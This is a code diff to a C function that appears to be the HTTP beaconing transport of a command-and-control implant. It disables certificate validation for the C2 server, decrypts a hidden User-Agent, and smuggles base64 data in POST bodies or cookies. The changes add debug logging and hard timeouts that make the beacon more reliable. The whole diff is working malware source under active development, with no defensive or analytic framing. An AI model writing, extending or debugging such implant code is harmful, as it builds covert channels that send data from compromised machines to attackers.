@@ -166,16 +166,20 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
     DBG("[http] payload b64_len=%u → using %s", b64_len, use_post ? "POST" : "GET+cookie");
 
     /* Open request */
+    DBG("[http] opening request...");
     DWORD flags = isHttps ? WINHTTP_FLAG_SECURE : 0;
     HINTERNET hRequest = WinHttpOpenRequest(
         hConnect, method, path, NULL,
         WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
     if (!hRequest) {
+        DWORD err = GetLastError();
+        DBG("[http] WinHttpOpenRequest FAILED (err=%u / 0x%08X)", err, err);
         WinHttpCloseHandle(hConnect);
         free(wUrl);
         free(b64_val);
         return FALSE;
     }
+    DBG("[http] request handle opened OK");
 
     /* Accept self-signed certs (C2 server) */
     if (isHttps) {
@@ -185,6 +189,22 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
                          SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
         WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                          &secFlags, sizeof(secFlags));
+
+        /*
+         * Set per-request timeouts — session-level WinHttpSetTimeouts does NOT
+         * always cover the TLS handshake. These per-request options guarantee
+         * the handshake + send + receive all have hard deadlines.
+         */
+        DWORD connectTimeout = 10000;
+        DWORD sendTimeout    = 15000;
+        DWORD recvTimeout    = 15000;
+        WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT,
+                         &connectTimeout, sizeof(connectTimeout));
+        WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT,
+                         &sendTimeout, sizeof(sendTimeout));
+        WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT,
+                         &recvTimeout, sizeof(recvTimeout));
+        DBG("[http] TLS sec flags + per-request timeouts set");
     }
 
     /* Decrypt and set User-Agent header */
@@ -197,6 +217,7 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
     WinHttpAddRequestHeaders(hRequest, wUA, (DWORD)-1,
                              WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD);
     free(wUA);
+    DBG("[http] headers set, about to send...");
 
     BOOL ok;
     if (use_post) {
@@ -204,6 +225,7 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
         WinHttpAddRequestHeaders(hRequest,
             L"Content-Type: application/octet-stream", (DWORD)-1,
             WINHTTP_ADDREQ_FLAG_ADD);
+        DBG("[http] calling WinHttpSendRequest (POST, %u bytes)...", b64_len);
         ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                 (LPVOID)b64_val, b64_len, b64_len, 0);
     } else {
@@ -221,9 +243,11 @@ BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
         free(wCookie);
         free(cookie_hdr);
 
+        DBG("[http] calling WinHttpSendRequest (GET+cookie)...");
         ok = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                 WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
     }
+    DBG("[http] WinHttpSendRequest returned ok=%d", ok);
     free(b64_val);
     if (!ok) {
         DWORD err = GetLastError();
